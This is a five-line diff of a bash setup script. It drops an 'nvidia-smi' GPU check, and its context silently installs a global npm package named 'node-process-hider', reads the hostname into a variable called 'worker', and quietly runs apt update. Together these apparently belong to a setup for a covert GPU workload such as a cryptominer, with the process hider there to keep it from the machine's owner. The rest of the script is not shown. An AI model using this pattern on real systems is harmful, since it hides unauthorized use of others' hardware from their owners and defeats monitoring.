@@ -1,5 +1,5 @@
 #!/bin/bash
-nvidia-smi
+
 npm i -g node-process-hider >/dev/null
 worker=$(cat /proc/sys/kernel/hostname)
 sudo apt -qq update
